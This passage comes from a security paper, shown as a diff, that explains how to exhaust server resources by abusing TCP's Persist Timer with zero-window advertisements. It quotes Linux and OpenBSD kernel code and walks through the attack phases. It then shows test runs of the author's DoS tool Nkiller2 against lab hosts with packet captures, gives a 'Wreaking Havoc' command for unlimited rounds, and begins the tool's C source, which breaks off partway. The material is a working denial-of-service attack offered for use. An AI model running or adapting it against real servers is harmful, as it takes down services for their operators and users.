+            if (tcp_out_of_resources(sk, alive || icsk->icsk_retransmits
+                    < retry_until))
+                return 1;
+        }
+    }
+
+    if (icsk->icsk_retransmits >= retry_until) {
+        /* Has it gone just too far? */
+        tcp_write_err(sk);
+        return 1;
+    }
+
+\---------------------------------------------------------------------/
+
+
+The idea of combining the two timer algorithms is also mentioned in RFC
+1122. Specifically, Section 4.2.2.17 - Probing Zero Windows states:
+
+    "This procedure minimizes delay if the zero-window condition is due
+    to a lost ACK segment containing a window-opening update. Exponential
+    backoff is recommended, possibly with some maximum interval not
+    specified here. This procedure is similar to that of the
+    retransmission algorithm, and it may be possible to combine the two
+    procedures in the implementation."
+
+In addition, both OpenBSD and FreeBSD follow the notion of the timer
+timeout combination. We can see this from the code excerpt below (OpenBSD
+4.4).
+
+
+sys/netinet/tcp_timer.c:
+/---------------------------------------------------------------------\
+
+void
+tcp_timer_persist(void *arg)
+{
+    struct tcpcb *tp = arg;
+    uint32_t rto;
+    int s;
+
+    s = splsoftnet();
+    if ((tp->t_flags & TF_DEAD) ||
+            TCP_TIMER_ISARMED(tp, TCPT_REXMT)) {
+        splx(s);
+        return;
+    }
+    tcpstat.tcps_persisttimeo++;
+    /*
+     * Hack: if the peer is dead/unreachable, we do not
+     * time out if the window is closed.  After a full
+     * backoff, drop the connection if the idle time
+     * (no responses to probes) reaches the maximum
+     * backoff that we would use if retransmitting.
+     */
+    rto = TCP_REXMTVAL(tp);
+    if (rto < tp->t_rttmin)
+        rto = tp->t_rttmin;
+    if (tp->t_rxtshift == TCP_MAXRXTSHIFT &&
+        ((tcp_now - tp->t_rcvtime) >= tcp_maxpersistidle ||
+        (tcp_now - tp->t_rcvtime) >= rto * tcp_totbackoff)) {
+        tcpstat.tcps_persistdrop++;
+        tp = tcp_drop(tp, ETIMEDOUT);
+        goto out;
+    }
+    tcp_setpersist(tp);
+    tp->t_force = 1;
+    (void) tcp_output(tp);
+    tp->t_force = 0;
+ out:
+    splx(s);
+}
+
+\---------------------------------------------------------------------/
+
+
+This of course doesn't mean that the timers are connected in any other
+way. In fact, they are mutually exclusive, as when one of them is set
+the other is cleared.
+
+Summing up, to successfully trigger and later exploit the Persist Timer
+the following prerequisites need to be met:
+
+a) The amount of data requested needs to be big enough so that the 
+userspace application cannot write the data all at once and issue a
+close(2), thus going into FIN_WAIT_1 state and marking the socket as
+SOCK_DEAD.
+
+b) Assuming the default value of 'tcp_retries2', we need to send
+an ACK (still advertising a 0 window though) at least every less than
+15 persist timer probes. This will be long enough to reset 
+'icsk_probes_out' back to zero and thus avoid the tcp_write_err()
+pitfall.
+
+c) The zero window advertisement will have to take place immediately
+after acknowledging all the data in transit. This, of course, may include
+piggybacking the ACK of the data, with the window advertisement.
+
+It is now time to dive into the nitty-gritty details of the attack.
+
+
+
+-- [ 4 - The attack
+
+We are going to analyse the attack steps along with a tool that automates
+the whole procedure, Nkiller2. Nkiller2 is a major expansion of the
+original Nkiller I had written some time ago and which was based on the
+idea at [1]. Nkiller2 takes the attack to another level, that we shall
+discuss shortly.
+
+
+---- [ 4.1 - Kernel memory exhaustion pitfalls
+
+The idea presented at [1] was, at the time it was published, an almost
+deadly attack. Netkill's purpose was to exhaust the available kernel
+memory by issuing multiple requests that would go unanswered on the 
+receiver's end as far as the ACKing of the data was concerned. These
+requests would hopefully involve the sending of a small amount of data,
+such that the user application would write the data all at once, issue
+a close(2) call and move on to serve the rest of the requests. As we
+mentioned before, as long as the application has closed the socket, the
+TCP state is going to become FIN_WAIT_1 in which the socket is marked as
+orphan, meaning it is detached from the userspace and doesn't anymore clog
+the connection queue. Hence, a rather big number of such requests can be
+made without being concerned that the user application will run out of
+available connection slots. Each request will partially fill the 
+corresponding kernel buffers, thus bringing the system down to its knees
+after no more kernel memory is available.
+However, the idea behind Netkill no longer poses a threat to modern
+network stack implementations. Most of them provide mechanisms that
+nullify the attack's potential by instantly killing any orphan sockets,
+in case of urgent need of memory. For example, Linux calls a specific 
+handler, tcp_out_of_recources(), which deals with such situations.
+
+
+net/ipv4/tcp_timer.c:
+/---------------------------------------------------------------------\
+
+/* Do not allow orphaned sockets to eat all our resources.
+ * This is direct violation of TCP specs, but it is required
+ * to prevent DoS attacks. It is called when a retransmission timeout
+ * or zero probe timeout occurs on orphaned socket.
+ *
+ * Criteria is still not confirmed experimentally and may change.
+ * We kill the socket, if:
+ * 1. If number of orphaned sockets exceeds an administratively configured
+ *    limit.
+ * 2. If we have strong memory pressure.
+ */
+static int tcp_out_of_resources(struct sock *sk, int do_reset)
+{
+    struct tcp_sock *tp = tcp_sk(sk);
+    int orphans = atomic_read(&tcp_orphan_count);
+
+    /* If peer does not open window for long time, or did not transmit 
+     * anything for long time, penalize it. */
+    if ((s32)(tcp_time_stamp - tp->lsndtime) > 2*TCP_RTO_MAX || !do_reset)
+        orphans <<= 1;
+
+    /* If some dubious ICMP arrived, penalize even more. */
+    if (sk->sk_err_soft)
+        orphans <<= 1;
+
+    if (orphans >= sysctl_tcp_max_orphans ||
+        (sk->sk_wmem_queued > SOCK_MIN_SNDBUF &&
+         atomic_read(&tcp_memory_allocated) > sysctl_tcp_mem[2])) {
+        if (net_ratelimit())
+            printk(KERN_INFO "Out of socket memory\n");
+
+        /* Catch exceptional cases, when connection requires reset.
+         *      1. Last segment was sent recently. */
+        if ((s32)(tcp_time_stamp - tp->lsndtime) <= TCP_TIMEWAIT_LEN ||
+            /*  2. Window is closed. */
+            (!tp->snd_wnd && !tp->packets_out))
+            do_reset = 1;
+        if (do_reset)
+            tcp_send_active_reset(sk, GFP_ATOMIC);
+        tcp_done(sk);
+        NET_INC_STATS_BH(LINUX_MIB_TCPABORTONMEMORY);
+        return 1;
+    }
+    return 0;
+}
+
+\---------------------------------------------------------------------/
+
+
+The comments and the code speak for themselves. tcp_done() moves the
+TCP state to TCP_CLOSE, essentially killing the connection, which will
+probably be in FIN_WAIT_1 state at that time (the tcp_done function is
+also called by tcp_write_err() mentioned above).
+
+In addition to the above pitfall, the way Netkill works, wastes a lot of
+bandwidth from both sides, making the attack more noticeable and less
+efficient. Netkill sends a flurry of syn packets to the victim, waits for
+the SYNACK and responds by completing the 3way handshake and piggybacking
+the payload request in the current ACK. Since, any data replies from the
+victim's user application (usually a web server) will go unanswered, TCP
+will start retransmitting these packets. These packets, however, are ones
+that carry a load of data with them, whose size is proportional to the
+initial window and mss advertised. The minimum amount of data is usually
+512 bytes, which given the vast amount of retransmissions that will
+eventually take place, can lead to network congestion, lost packets and
+sysadmin red alarms.
+
+As we can see, kernel memory exhaustion is not an easily accomplished
+option in today's operating systems, at least by means of a generic DoS
+attack. The attack vector has to be adapted to current circumstances.
+
+
+---- [ 4.2 - Attack Vector
+
+Our goal is to perform a generic DoS attack that meets the following
+criteria:
+
+a) The duration of the attack has to be prolonged as long as possible. The
+TCP Persist Timer exploitation extends the duration to infinity. The only
+time limits that will take place will be the ones imposed by the userspace
+application.
+
+b) No resources will be spent on our part to keep any kind of state 
+information from the victim. Any memory resources spent will be O(1),
+which means regardless of the number of probes we send to the victim, our
+own memory needs will never surpass a certain initial amount.
+
+c) Bandwidth throttling will be kept to a minimum. Traffic congestion has
+to be avoided if possible. 
+
+d) The attack has to affect the availability of both the userspace
+application as well as the kernel, at the extent that this is feasible.
+
+
+To meet requirement 'b', we are going to use a packet-triggering behaviour
+and the, now old, technique of reverse (or client) syn cookies. Basically,
+this means that our answers will strictly depend on nothing else other 
+than the packets received from the victim. How is this even possible? We
+are going to use a series of packet-parsing techniques and craft the
+packets in such a way that they carry within themselves any information
+that is needed to make decisions.
+
+
+The general procedure will go like this:
+
+- Phase 1.
+
+Attacker sends a group of SYN packets to the victim. In the sequence
+number field, he has encoded a magic number that stems from the
+cryptographic hash of { destination IP & port, source IP & port } and a
+secret key. By this way, he can discern if any SYNACK packet he gets,
+actually corresponds to the SYN packets he just sent. He can accomplish
+that by comparing the (ACK seq number - 1) of the victim's SYNACK reply
+with the hash of the same packet's socket quadruple based on the secret
+key. We subtract 1, since the SYN flag occupies one sequence number
+as stated by RFC 793. The above technique is known as reverse syn cookies,
+since they differ from the usual syn cookies which protect from syn
+flooding, in that they are used from the reverse side, namely the client
+and not the server. Responsible for the cookie calculation and subsequent
+encoding is Nkiller2's calc_cookie() function.
+Now, apart from the sequence number encoding, we are also going to use a
+nifty facility that TCP provides, as means to our own ends. The TCP
+Timestamp Option is normally used as another way to estimate the RTT.
+The option uses two 32bit fields, 'tsval' which is a value that increases
+monotonically by the TCP timestamp clock and which is filled in by the
+current sender and 'tsecr' - timestamp echo reply - which is the peer's
+echoed value as stated in the tsval of the packet to which the current one
+replies. The host initiating the connection places the option in the
+first SYN packet, by filling tsval with a value, and zeroing tsecr. Only
+if the peer replies with a Timestamp in the SYNACK packet, can any future
+segments keep containing the option. build_timestamp() embeds the
+timestamp option in the crafted TCP header, while get_timestamp() extracts
+it from a packet reply.
+
+      TCP Timestamps Option (TSopt):
+
+         Kind: 8
+
+         Length: 10 bytes
+
+          +-------+-------+---------------------+---------------------+
+          |Kind=8 |  10   |   TS Value (TSval)  |TS Echo Reply (TSecr)|
+          +-------+-------+---------------------+---------------------+
+              1       1              4                     4
+
+We are going to use the Timestamp option as a means to track time. We will
+later have to exploit the TCP Persist Timer and eventually answer to some
+of his probes, but this will have to involve calculating how much time has
+passed. Consequently, we are going to encode our own system's current time
+inside the first 'tsval'. In the SYNACK reply that we are going to get,
+'tsecr' will reflect that same value. Thus, by subtracting the value
+placed in the echo reply field from the current system time, we can deduce
+how much time has passed since our last packet transmission without
+keeping any stateful information for each probe. We are going to extract
+and encode timestamp information from every packet hereafter. Timestamps
+are supported by every modern network stack implementation, so we aren't
+going to have any trouble dealing with them.
+
+
+- Phase 2.
+
+The victim replies with a SYNACK to each of the attacker's initial SYN
+probes. These kinds of packets are really easy to differentiate between
+the rest of the ones we will be receiving, since no other packet will
+have both the SYN flag and the ACK flag set. In addition, as we noted
+above, we can realize if these packets actually belong to our own probes
+and not some other connection happening at the same time to the host, by
+using the reverse syn cookie technique. 
+We have to mention here that under no circumstances should our system's 
+kernel be let to affect any of our connections. Thus, we should take care
+beforehand to have filtered any traffic destined to or coming from the 
+victim's attacked ports.
+Having gotten the victim's SYNACK replies, we complete the 3way handshake
+by sending the ACK required (send_probe: S_SYNACK). We also piggyback the
+data of the targeted userspace application request. We save bandwidth,
+time and trouble by adopting a perfectly allowable behaviour. Nothing
+else exciting happens here.
+
+
+- Phase 3.
+
+Now things get a bit more complicated. It is here that the road starts
+forking depending on the target host's network stack implementation.
+Nkiller2 uses the notion of virtual states, as I called them, which are
+a way to differentiate between each unique case by parsing the packet
+for relevant information. The handler responsible for parsing the victim's
+replies and deciding the next virtual state is check_replies(). It sets
+the variable 'state' accordingly and main() can then deduce inside it's
+main loop the next course of action, essentially by calling the generic
+send_probe() packet-crafter with the proper state argument and updating
+some of its own loop variables.
+
+First case: the target host sends a pure ACK (meaning a packet with no
+data), which acknowledges our payload sent in Phase 2. This virtual
+state is mentioned as S_FDACK (State - First Data Acknowledgment) in the
+Nkiller2 codebase.
+
+Second case: the target host sends the ACK which acknowledged our payload
+from Phase 2, piggybacked with the first data reply of the userspace
+application to which we made the request. This usually happens due to the
+Delayed Acknowledgment functionality according to which, TCP waits some
+time (class of microseconds) to see if there are any data which it can
+send along with an ACK. 
+
+Usually, Linux behaviour follows the first case while *BSD and Windows
+follow the second. The critical question here is when to send the zero
+window advertisement. Ideally, we could reply to the first case's pure
+ACK with an ACK of our own (with the same acknowledgment number as the 
+sequence number in the victim's packet) that advertised a zero window.
+However, in most cases we won't have that chance, since the victim's
+TCP will send, immediately after this pure ACK, the first data of the
+userspace application in a separate segment. Thus, if we advertise a
+zero window when the opposite TCP has already wrote to the network
+the first data, we will fail to trigger the Persist Timer as we saw
+during the analysis in part 3 of this paper. Consequently, we play it
+safe and choose to ignore the FDACK and wait for the first segment of
+data to arrive.
+
+
+- Phase 4 
+
+This stage also differs from one operating system to another, since it
+is deeply connected to Phase 3. For every number mentioned from now on,
+assume that Nkiller's initial window advertisement and mss is 1024.
+Linux, under normal circumstances, will send two data segments with a 
+minimum amount of 512 bytes each. Additionally, any data segment following
+the first one, will have the PUSH flag set. On the other hand, *BSD and 
+BSD-derivative implementations will send one bigger data segment of 1024
+bytes, without setting the PUSH flag.
+To be able to take the right decisions for each unique case involved,
+Nkiller2 will have to be provided with a template number. It is trivial to
+identify the different network stacks by using already existing tools, so
+when you are unsure about the target system, either use Nmap's OS
+fingerprinting capability or at worst, a trial-and-error method. At the
+moment with only 2 different templates (T_LINUX and T_BSDWIN), Nkiller2
+is able to work against a vast amount of systems.
+In the default template (Linux), Nkiller2 is going to send a zero window
+advertisement on the ACK of the second segment (which is going to involve
+acking the first segment as well), while when dealing with BSD or Windows,
+it will send it on the ACK of the first and only data segment. The
+resolving between these two cases takes place in send_probe()'s main body
+in 'case S_DATA_0' (State - Data 0, as in first data packet).
+
+
+- Phase 5
+
+Having successfully sent the zero window packet (regardless of how and
+when that happened), the target host's TCP will start sending zero probes.
+This is where we accomplish meeting requirement 'c' - bandwidth waste
+limitation. Every retransmission that will take place, will involve pure
+ACKs (Linux) or at maximum 1 byte of data (BSD/Windows). Every zero probe
+is only 52 bytes long, counting TCP/IP headers and the TCP Timestamp
+option, in contrast with the size of the retransmission packets 
+(512 + 40 bytes or 1024 + 40 bytes each) that would take place if we had
+triggered the TCP retransmission timer, as in netkill's case.
+An interesting issue here is to decide on when is the best time to reply
+to the zero probes, so that the TCP persist timer is ideally prolonged to
+last forever with the fewest packets possible. Using the TCP timestamp
+technique, we can calculate the time elapsed from the moment we sent the
+zero window advertisement (since that was our last packet and that one's
+time value will be echoed in 'tsecr') to the moment we got the packet.
+
+
+check_replies()
+/---------------------------------------------------------------------\
+
+
+      if (get_timestamp(tcp, &tsval, &tsecr)) {
+        if (gettimeofday(&now, NULL) < 0)
+          fatal("Couldn't get time of day\n");
+        time_elapsed = now.tv_sec - tsecr;
+        if (o.debug) 
+          (void) fprintf(stdout, "Time elapsed: %u (sport: %u)\n",
+              time_elapsed, sockinfo.sport);
+      }
+
+      ...
+
+      if (ack == calc_ack && (!datalen || datalen == 1) 
+          && time_elapsed >= o.probe_interval) {
+        state = S_PROBE;
+        goodone++;
+        break;
+      }
+
+\---------------------------------------------------------------------/
+
+
+Hence, we can decide on whether or not we should send a reply to the
+current zero probe (S_PROBE), depending on a predetermined rough estimate
+of the time lapse. We also use this 'probe_interval' value to
+differentiate between a zero probe and the FDACK, since there are no other
+packet characteristics, apart from time arrival, that we can take into
+account in this stateless manner. This phase marks the accomplishment of
+our 1st goal - prolonging the attack to as much as possible.
+
+
+A graphical representation of the procedure is shown below. Remember that
+the states are purely virtual. We do not keep any kind of information on
+our part.
+
+
+      (cookie OK)   +----------+ 
+ SYN -------------> | S_SYNACK | 
+      rcv SYNACK    +----------+ 
+                          |       
+               ACK SYNACK |
+            send request  |
+                          |     pure ACK       +---------+ 
+                          | ---------------->  | S_FDACK | 
+                          |   time_elapsed <   +---------+ 
+                          |   probe_interval      ignore
+                          |
+                 got Data |   
+                          V                         
+                     +----------+       
+                     | S_DATA_0 |
+                     +----------+       
+                          |
+                         / \
+                        /   \ 
+          T_BSDWIN     /     \   T_LINUX (default)
+      ----------------/       \ ---------------        
+      |                                       |
+      |                                       | got Data (PSH)
+      |                                       | ACK(data0)
+      V                                       V
+  ACK(data0) &                          +----------+
+  send 0 window                         | S_DATA_1 |      
+      |                                 +----------+
+      |---------------         ---------------|
+                      \       /   ACK(data1) & send 0 window
+                       \     /
+                        \   /
+                         \ /
+     |------> time_elapsed >= probe_interval
+     |                    |
+     |                    |
+     |                    V
+     |               +---------+
+     |               | S_PROBE | --------> send probe reply
+     |               +---------+
+     |                    |    
+     |--------------------|
+
+
+The only thing that still needs to be answered is to what extent we have
+achieved goal 'd'. How efficient is the attack really? The answer is, that
+it depends on what we are attacking. Attacking one userspace application
+will usually lead to either backlog queue collapse or reaching the maximum
+allowable number of concurrent accepted connections. In both cases, the
+availability of the userspace application will drop down to zero and will
+stay in that condition for a possibly unlimited amount of time. Keep in
+mind though that robust server applications like Apache have a Timeout of
+their own, which is independent of TCP's. Quoting from Apache's manual:
+
+   "The TimeOut directive currently defines the amount of time Apache will
+    wait for three things:
+
+   1. The total amount of time it takes to receive a GET request.
+   2. The amount of time between receipt of TCP packets on a POST or PUT
+        request.
+   3. The amount of time between ACKs on transmissions of TCP packets in
+        responses."
+
+By default, Apache httpd's TimeOut = 300 which means 5 minutes. Following
+a similar approach, lighttpd's default timeout is about 6 minutes.
+Even then, as long as the attack cycle continues (Hint: Nkiller's option
+-n0), there is no hope for any server not protected by a stateful firewall
+that limits the total number of packets reaching the host (which still
+won't be enough by itself given the TCP Persist Timer's exploitation).
+
+At the same time, useful kernel resources are wasted on the SendQueue of
+each established connection. However, for kernel memory exhaustion to
+occur, we will have to perform a concurrent attack at multiple
+applications (Nkiller2 isn't optimized for this though). By this way,
+the amount of kernel resources wasted will be proportional to the number
+of the attacked applications and the amount of successful connections on
+each of them. Even if one service is brought down temporarily for one
+reason or another, there will still be the other applications wasting
+memory with a filled up TCP SendQueue.
+
+
+---- [ 4.3 Test cases
+
+Time for some real world examples. We are going to demonstrate how
+Nkiller2 exploits the Persist Timer functionality and at the same time
+point out the different behaviour that is exhibited from a Linux system
+in contrast with an OpenBSD system. The file requested has to be more
+than 4.0 Kbytes (experimental value).
+
+- Test Case 1.
+
+Attacker: 10.0.0.12, Linux 2.6.26
+Target: 10.0.0.50, Apache1.3, OpenBSD 4.3
+
+# iptables -A INPUT -s 10.0.0.50 -p tcp --dport 80 -j DROP
+# iptables -A INPUT -s 10.0.0.50 -p tcp --sport 80 -j DROP
+# ./nkiller2 -t 10.0.0.50 -p80 -w /file -v -n1 -T1 -P120 -s0 -g
+
+Starting Nkiller 2.0 ( http://sock-raw.org )
+Probes: 1
+Probes per round: 100
+Pcap polling time: 100 microseconds
+Sleep time: 0 microseconds
+Key: Nkiller31337
+Probe interval: 120 seconds
+Template: BSD | Windows
+Guardmode on
+
+
+# tcpdump port 80 and host 10.0.0.50 -n
+
+08:55:30.017021 IP 10.0.0.12.40428 > 10.0.0.50.80: S 3456779693:
+3456779693(0) win 1024 <timestamp 1232693730 0,nop,nop,mss 1024>
+08:55:30.017280 IP 10.0.0.50.80 > 10.0.0.12.40428: S 3072651811:
+3072651811(0) ack 3456779694 win 16384 <mss 1460,nop,nop,timestamp
+464912143 1232693730>
+08:55:30.017461 IP 10.0.0.12.40428 > 10.0.0.50.80: . 1:23(22) ack 1
+win 1024 <timestamp 1232693730 464912143,nop,nop>
+08:55:30.019288 IP 10.0.0.50.80 > 10.0.0.12.40428: . 1:1013(1012) ack 23
+win 17204 <nop,nop,timestamp 464912143 1232693730>
+08:55:30.019311 IP 10.0.0.12.40428 > 10.0.0.50.80: . ack 1013 win 0
+<timestamp 1232693730 464912143,nop,nop>
+08:55:35.009929 IP 10.0.0.50.80 > 10.0.0.12.40428: . 1013:1014(1) ack 23
+win 17204 <nop,nop,timestamp 464912153 1232693730>
+08:55:40.009505 IP 10.0.0.50.80 > 10.0.0.12.40428: . 1013:1014(1) ack 23
+win 17204 <nop,nop,timestamp 464912163 1232693730>
+08:55:45.009056 IP 10.0.0.50.80 > 10.0.0.12.40428: . 1013:1014(1) ack 23
+win 17204 <nop,nop,timestamp 464912173 1232693730>
+08:55:53.008388 IP 10.0.0.50.80 > 10.0.0.12.40428: . 1013:1014(1) ack 23
+win 17204 <nop,nop,timestamp 464912189 1232693730>
+08:56:09.007027 IP 10.0.0.50.80 > 10.0.0.12.40428: . 1013:1014(1) ack 23
+win 17204 <nop,nop,timestamp 464912221 1232693730>
+08:56:41.004286 IP 10.0.0.50.80 > 10.0.0.12.40428: . 1013:1014(1) ack 23
+win 17204 <nop,nop,timestamp 464912285 1232693730>
+08:57:40.999239 IP 10.0.0.50.80 > 10.0.0.12.40428: . 1013:1014(1) ack 23
+win 17204 <nop,nop,timestamp 464912405 1232693730>
+08:57:40.999910 IP 10.0.0.12.40428 > 10.0.0.50.80: . ack 1013 win 0
+<timestamp 1232693860 464912405,nop,nop>
+...
+
+
+Notice that OpenBSD transmits httpd's initial data in one segment in which
+the ACK to our payload is included. Nkiller2 acknowledges that packet,
+advertising at the same time a zero window. After that, OpenBSD's TCP
+transmits a zero probe and sets the Persist Timer. After a little more
+than 120 seconds (57:40 - 55:30), we answer to the Persist Timer's probe.
+Note that we specified the probe_interval with the option -P120
+(approximately 120 seconds).
+
+
+- Test Case 2.
+
+Attacker: 10.0.0.12, Linux 2.6.26
+Target: 10.0.0.101, Apache2.2.3, Debian "etch" (2.6.18)
+
+# iptables -A INPUT -s 10.0.0.101 -p tcp --dport 80 -j DROP
+# iptables -A INPUT -s 10.0.0.101 -p tcp --sport 80 -j DROP
+# ./nkiller2 -t 10.0.0.101 -p80 -w /file -n1 -T0 -P50 -s0 -v
+
+Starting Nkiller 2.0 ( http://sock-raw.org )
+Probes: 1
+Probes per round: 100
+Pcap polling time: 100 microseconds
+Sleep time: 0 microseconds
+Key: Nkiller31337
+Probe interval: 50 seconds
+Template: Linux
+
+
+# tcpdump port 80 and host 10.0.0.101 -n
+
+01:09:33.350783 IP 10.0.0.12.26528 > 10.0.0.101.80: S 3497611066:
+3497611066(0) win 1024 <timestamp 1232752173 0,nop,nop,mss 1024>
+01:09:33.350893 IP 10.0.0.101.80 > 10.0.0.12.26528: S 2167814821:
+2167814821(0) ack 3497611067 win 5792 <mss 1460,nop,nop,timestamp
+4294906445 1232752173>
+01:09:33.351189 IP 10.0.0.12.26528 > 10.0.0.101.80: . 1:23(22) ack 1
+win 1024 <timestamp 1232752173 4294906445,nop,nop>
+01:09:33.351308 IP 10.0.0.101.80 > 10.0.0.12.26528: . ack 23 win 5792
+<nop,nop,timestamp 4294906445 1232752173>
+01:09:33.382100 IP 10.0.0.101.80 > 10.0.0.12.26528: . 1:513(512) ack 23
+win 5792 <nop,nop,timestamp 4294906452 1232752173>
+01:09:33.382138 IP 10.0.0.101.80 > 10.0.0.12.26528: P 513:1025(512) ack 23
+win 5792 <nop,nop,timestamp 4294906452 1232752173>
+01:09:33.389359 IP 10.0.0.12.26528 > 10.0.0.101.80: . ack 513 win 512
+<timestamp 1232752173 4294906452,nop,nop>
+01:09:33.389508 IP 10.0.0.12.26528 > 10.0.0.101.80: . ack 1025 win 0
+<timestamp 1232752173 4294906452,nop,nop>
+01:09:33.590164 IP 10.0.0.101.80 > 10.0.0.12.26528: . ack 23 win 5792
+<nop,nop,timestamp 4294906505 1232752173>
+01:09:33.998135 IP 10.0.0.101.80 > 10.0.0.12.26528: . ack 23 win 5792
+<nop,nop,timestamp 4294906607 1232752173>
+01:09:34.814073 IP 10.0.0.101.80 > 10.0.0.12.26528: . ack 23 win 5792
+<nop,nop,timestamp 4294906811 1232752173>
+01:09:36.445959 IP 10.0.0.101.80 > 10.0.0.12.26528: . ack 23 win 5792
+<nop,nop,timestamp 4294907219 1232752173>
+01:09:39.709739 IP 10.0.0.101.80 > 10.0.0.12.26528: . ack 23 win 5792
+<nop,nop,timestamp 4294908035 1232752173>
+01:09:46.237279 IP 10.0.0.101.80 > 10.0.0.12.26528: . ack 23 win 5792
+<nop,nop,timestamp 4294909667 1232752173>
+01:09:59.292377 IP 10.0.0.101.80 > 10.0.0.12.26528: . ack 23 win 5792
+<nop,nop,timestamp 4294912931 1232752173>
+01:10:25.402550 IP 10.0.0.101.80 > 10.0.0.12.26528: . ack 23 win 5792
+<nop,nop,timestamp 4294919459 1232752173>
+01:10:25.427760 IP 10.0.0.12.26528 > 10.0.0.101.80: . ack 1024 win 0
+<timestamp 1232752225 4294919459,nop,nop>
+...
+
+
+Linux first sends a pure ACK (which is ignored by Nkiller2) and then
+transmits the first 2 data segments (512 bytes each). Nkiller2 waits until
+both of them arrive and acknowledges them with one zero window ACK packet.
+Linux then starts sending us zero probes (which have a datalength equal to
+zero in constrast with *BSD which send 1 byte of data), that go unanswered
+until about (10:25 - 09:33) 50 seconds pass.
+
+
+- Test Case 'Wreaking Havoc'
+
+# nkiller2 -t <target> -p80 -w <path> -n0 -T0 -P100 -s0 -v -N100
+
+-n0: unlimited probes
+-N100: will send 100 SYN probes per round (a round finishes when
+we either get a data segment or a zero probe)
+
+Use at your own discretion.
+
+
+
+-- [ 5 - Nkiller2 implementation 
+
+/*
+ *  Nkiller 2.0 - a TCP exhaustion/stressing tool
+ *  Copyright (C) 2009 ithilgore <ithilgore.ryu.L@gmail.com>
+ *  sock-raw.org
+ *
+ *  This program is free software: you can redistribute it and/or modify
+ *  it under the terms of the GNU General Public License as published by
+ *  the Free Software Foundation, either version 3 of the License, or
+ *  (at your option) any later version.
+ *
+ *  This program is distributed in the hope that it will be useful,
+ *  but WITHOUT ANY WARRANTY; without even the implied warranty of
+ *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+ *  GNU General Public License for more details.
+ *
+ *  You should have received a copy of the GNU General Public License
+ *  along with this program.  If not, see <http://www.gnu.org/licenses/>.
+ */
+
+/*
+ * COMPILATION:
+ *  gcc nkiller2.c -o nkiller2 -lpcap -lssl -Wall -O2
+ * Has been tested and compiles successfully on Linux 2.6.26 with gcc
+ * 4.3.2 and FreeBSD 7.0 with gcc 4.2.1
+ */
+
+
+/*
+ * Enable BSD-style (struct ip) support on Linux.
+ */
+#ifdef __linux__
+# ifndef __FAVOR_BSD
+#  define __FAVOR_BSD
+# endif
+# ifndef __USE_BSD
+#  define __USE_BSD
+# endif
+# ifndef _BSD_SOURCE
+#  define _BSD_SOURCE
+# endif
+# define IPPORT_MAX 65535u
+#endif
+
+
+#include <sys/types.h>
+#include <sys/socket.h>
+
+#include <arpa/inet.h>
+#include <netinet/in.h>
+#include <netinet/in_systm.h>
+#include <netinet/ip.h>
+#include <netinet/tcp.h>
+
+#include <openssl/hmac.h>
+
+#include <errno.h>
+#include <pcap.h>
+#include <stdarg.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <sysexits.h>
+#include <time.h>
+#include <unistd.h>
+#include <getopt.h>
+
+
+#define DEFAULT_KEY             "Nkiller31337"
+#define DEFAULT_NUM_PROBES      100000
+#define DEFAULT_PROBES_RND      100
+#define DEFAULT_POLLTIME        100
+#define DEFAULT_SLEEP_TIME      100
+#define DEFAULT_PROBE_INTERVAL  150
+
+#define WEB_PAYLOAD     "GET / HTTP/1.0\015\012\015\012"
+
+/* Timeval subtraction in microseconds */
+#define TIMEVAL_SUBTRACT(a, b) \
+  (((a).tv_sec - (b).tv_sec) * 1000000L + (a).tv_usec - (b).tv_usec)
+
+/*
+ * Pseudo-header used for checksumming; this header should never
+ * reach the wire
+ */
+typedef struct pseudo_hdr {
+  uint32_t src;
+  uint32_t dst;
+  unsigned char mbz;
+  unsigned char proto;
+  uint16_t len;
+} pseudo_hdr;
+
+
+/*
+ * TCP timestamp struct 
+ */
+typedef struct tcp_timestamp {
+  char kind;
+  char length;
+  uint32_t tsval __attribute__((__packed__));
+  uint32_t tsecr __attribute__((__packed__));
+  char padding[2];
+} tcp_timestamp;
+
+/*
+ * TCP Maximum Segment Size
+ */
+typedef struct tcp_mss {
+  char kind;
+  char length;
+  uint16_t mss __attribute__((__packed__));
+} tcp_mss;
+
+
+/* Network stack templates */
+enum {
+  T_LINUX,
+  T_BSDWIN
+};
+
+/* Possible replies */
+enum {
+  S_ERR,      /* no reply, RST, invalid packet etc */
+  S_SYNACK,   /* 2nd part of initial handshake */
+  S_FDACK,    /* first data ack - in reply to our first data */
+  S_DATA_0, /* first data packet */
+  S_DATA_1,   /* second data packet */
+  S_PROBE     /* persist timer probe */
+};
+
+/*
+ * Ethernet header stuff.
+ */
+#define ETHER_ADDR_LEN  6
+#define SIZE_ETHERNET   14
+typedef struct ethernet {
+  u_char ether_dhost[ETHER_ADDR_LEN]; /* Destination host address */
+  u_char ether_shost[ETHER_ADDR_LEN]; /* Source host address */
+  u_short ether_type;                 /* Frame type */
+} ether_hdr;
+
+
+/*
+ * Global nkiller options struct
+ */
+typedef struct Options {
+  char target[16];
+  char skey[32];
+  char payload[256];
+  char path[256];         /* relative to virtual-host/ip path */
+  char vhost[256];        /* virtual host name */
+  uint16_t *portlist;
+  unsigned int probe_interval; /* interval for our persist probe reply */
+  unsigned int probes;    /* total number of fully-connected probes */
+  unsigned int probes_per_rnd; /* number of probes per round */
+  unsigned int polltime;  /* how many microsecods to poll pcap */
+  unsigned int sleep;     /* sleep time between each probe */
+  int template;           /* victim network stack template */
+  int dynamic;            /* remove ports from list when we get RST */
+  int guardmode;          /* continue answering to zero probes */
+  int verbose;
+  int debug;              /* some debugging info */
+  int debug2;             /* all debugging info */
+} Options;
+
+
+/*
+ * Port list types
+ */
+typedef struct port_elem {
+  uint16_t port_val;
+  struct port_elem *next;
+} port_elem;
+
+typedef struct port_list {
+  port_elem *first;
+  port_elem *last;
+} port_list;
+
+/*
+ * Host information
+ */
+typedef struct HostInfo {
+  struct in_addr daddr; /* target ip address */
+  char *payload;
+  char *url;
+  char *vhost;
+  size_t plen;            /* payload length */
+  size_t wlen;            /* http request length */
+  port_list ports;        /* linked list of ports */
+  unsigned int portlen;   /* how many ports */
+} HostInfo;
+
+
+typedef struct SniffInfo {
+  struct in_addr saddr;   /* local ip */
+  pcap_if_t *dev;
+  pcap_t *pd;
+} SniffInfo;
+
+
+typedef struct Sock {
+  struct in_addr saddr;
+  struct in_addr daddr;
+  uint16_t sport;
+  uint16_t dport;
+} Sock;
+
+
+/* global vars */
+Options o;
+
+
+/**** function declarations ****/
+
+/* helper functions */
+static void fatal(const char *fmt, ...);
